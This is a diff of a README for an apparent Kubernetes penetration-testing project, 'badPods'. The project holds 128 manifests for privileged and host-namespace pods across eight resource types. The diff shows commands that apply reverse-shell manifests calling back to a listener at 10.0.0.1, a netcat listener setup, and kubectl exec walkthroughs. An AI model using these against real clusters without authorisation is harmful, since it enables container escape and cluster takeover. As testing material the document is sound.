@@ -29,8 +29,12 @@ Nothing allowed | [readme](manifests/nothing-allowed/) | [manifest](manifests/no
 Check out blog post here
 
 # Organization
-There are 128 manifests. 
-* `8 types of badPods` X `8 types of resources` X `2 access methods - exec/reverse shell`
+* 128 manifests
+   * 8 badPods (hostpid, hostnetwork, everything-allowed, etc.)
+   * 8 resource types (pod, deployment, replicaset, statefulset, etc.)
+   * 2 ways to access (exec & reverse shell)
+
+
 ```bash
 ├── manifests
 │   ├── everything-allowed
@@ -69,8 +73,7 @@ There are 128 manifests.
 ```
 
 ### "There are Eight ways to create a Pod"
-As [Eviatar Gerzi (@g3rzi)](https://twitter.com/g3rzi) points out in the post [Eight Ways to Create a Pod
-](https://www.cyberark.com/resources/threat-research-blog/eight-ways-to-create-a-pod), there are 8 different controllers that create a pod, or a set of pods.  You might be a situation where you are not authorized to create pods, but you can create another resource type that will create one or more pods. For each badPod type, there are manifests that correspond to all eight resource types. 
+As [Eviatar Gerzi (@g3rzi)](https://twitter.com/g3rzi) points out in the post [Eight Ways to Create a Pod](https://www.cyberark.com/resources/threat-research-blog/eight-ways-to-create-a-pod), there are 8 different controllers that create a pod, or a set of pods.  You might be a situation where you are not authorized to create pods, but you can create another resource type that will create one or more pods. For each badPod type, there are manifests that correspond to all eight resource types. 
 
 ### Reverse shells
 While common, it is not always the case that you can exec into pods that you can create. To help in those situations, a version of each manifest is included that will call back to your listener as soon as the pod is created. 
@@ -109,21 +112,17 @@ HOST="10.0.0.1" PORT="3116" envsubst < ./manifests/hostnetwork/pod/hostnetwork-r
 HOST="10.0.0.1" PORT="3117" envsubst < ./manifests/hostipc/pod/hostipc-revshellv-pod.yaml | kubectl apply -f -
 HOST="10.0.0.1" PORT="3118" envsubst < ./manifests/nothing-allowed/pod/nothing-allowed-revshell-pod.yaml | kubectl apply -f -
 ```
-### Create a cronjob of the hostNetwork Pod
+### Create a cronjob with the hostNetwork pod
 ```bash
 kubectl apply -f manifests/hostnetwork/cronjob/hostnetwork-exec-cronjob.yaml
-```
-
-```
+ 
 cronjob.batch/hostnetwork-exec-cronjob created
 ```
 
 Find the created pod
 ```bash
 kubectl get pods | grep cronjob
-```
-
-```
+ 
 NAME                                        READY   STATUS    RESTARTS   AGE
 hostnetwork-exec-cronjob-1607351160-gm2x4   1/1     Running   0          24s
 ```
@@ -133,7 +132,7 @@ Exec into pod
 kubectl exec -it hostnetwork-exec-cronjob-1607351160-gm2x4 -- bash
 ```
 
-### Create a deployment of the priv-and-hostpid Pod
+### Create a deployment with the priv-and-hostpid pod
 ```bash
 kubectl apply -f manifests/priv-and-hostpid/deployment/priv-and-hostpid-exec-deployment.yaml
  
@@ -151,7 +150,7 @@ Exec into pod
 kubectl exec -it priv-and-hostpid-exec-deployment-65dbfbf947-qwpz9 -- bash
 ```
 
-### Create all eight resouce types for the everything-allowed type
+### Create all eight resouce types using the everything-allowed pod
 ```bash
 find manifests/everything-allowed/ -name \*-exec-*.yaml -exec kubectl apply -f {} \;
 
@@ -184,7 +183,7 @@ everything-allowed-exec-statefulset-0                 1/1     Running   0       
 everything-allowed-exec-statefulset-1                 1/1     Running   0          42s
 ```
 
-### Create a reverse shell privileged pod
+### Create a reverse shell using the privileged pod
 Set up listener
 ```bash
 nc -nvlp 3116
